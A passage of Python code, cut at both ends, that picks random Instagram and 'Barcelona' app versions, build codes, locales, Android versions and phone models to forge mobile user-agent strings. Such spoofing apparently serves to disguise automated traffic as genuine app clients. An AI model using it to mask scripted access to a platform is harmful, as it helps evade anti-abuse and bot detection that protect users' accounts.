,'262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
	igv = ("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
	igve=igv.split(",")
	kntlgoreng = rc(["kenzo","markw","mido","ginkgo","hydrogen","tissot_sprout"])
	redmis = rc(["Redmi Note 4","Redmi Note 8","Redmi Note 9 Pro","MI MAX","Mi A1","Redmi Note 9S","23127PN0CC","Redmi Note 5","M2007J17C","M2101K7BNY","2201116SC","M2011K2C","Redmi Note 11R"])
	mereek = rc(["samsung","realme","OnePlus","LAVA","TCL","motorola","Xiaomi/POCO","T790Y","Amazon","Google/google","Xiaomi","OPPO"])
	mereek1 = rc(["SM-A325M","RMX3363","CPH2465","Z60s","5087Z","moto g(6) plus","22111317PG","samsung R883T","Seattle","KFRAWI","Pixel 7 Pro","M2007J3SG","R7kf","PEPM00","SM-N910F"])
	mereek2 = rc(["a32","RE54ABL1","OP5958L1","Z60s","Doha_TMO","evert_nt","moonstone","R883T","raspite","cheetah","apollo","R7f","OP4ECB","trlte"])
	mereek3 = rc(["mt6769t","qcom","mt6739","mt6762","mt8169","cheetah","trlte"])
	ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; {mereek}; {mereek1}; {mereek2}; {mereek3}; {basa}; {kode})'
	ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi; {redmis}; {kntlgoreng}; qcom; {basa}; {kode})'
	ua3 = f'Instagram {versi} (iPhone14,2; iOS 17_4_1; it_IT; it; scale=3.00; {pxl}; {basa}; {kode}; NW/3)'
	uaa = rc([ua1,ua2,ua3])
	return uaa

def Android_Version(android_version):
	if str(android_version) == '9':
		return ('28')
	elif str(android_version) == '10':
		return ('29')
	elif str(android_version) == '11':
		return ('30')
	elif str(android_version) == '12':
		return ('31')
	else:
		return ('32')

def UserAgentBarcelona():
	#; #
	dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
	android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.